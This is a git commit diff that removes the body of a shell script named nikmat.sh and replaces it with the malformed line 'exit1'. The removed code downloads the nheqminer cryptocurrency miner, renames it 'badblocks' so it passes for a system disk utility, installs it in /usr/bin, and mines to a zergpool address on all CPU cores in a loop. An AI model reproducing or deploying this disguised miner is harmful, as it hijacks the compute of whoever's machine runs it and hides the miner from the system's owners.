8590dfa80e8000468d3776158ab998a011678ba0
jontoriku <91953912+jontoriku@users.noreply.github.com>
2021-10-05 11:30:01 +0000

    Update nikmat.sh

--- nikmat.sh
+++ nikmat.sh
@@ -1,16 +1,3 @@
 #!/bin/sh
- 
-COUNTER=20
-until [  $COUNTER -lt 10 ]; do
 
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-tar -xvzf nheqminer-Linux-v0.8.2.tgz
-tar xf nheqminer-Linux-v0.8.2.tar.gz
-cd nheqminer
-mv nheqminer badblocks
-mv badblocks /usr/bin
-badblocks -v -l verushash.asia.mine.zergpool.com:3300 -u D5snbNHPaNYMHAESeTrreRRVx3NLRdGo65.$(echo $(shuf -i 1-999 -n 1)-Ren) -p c=$coin -t $(nproc --all)
- 
-     echo COUNTER $COUNTER
-     let COUNTER-=1
-done
+exit1
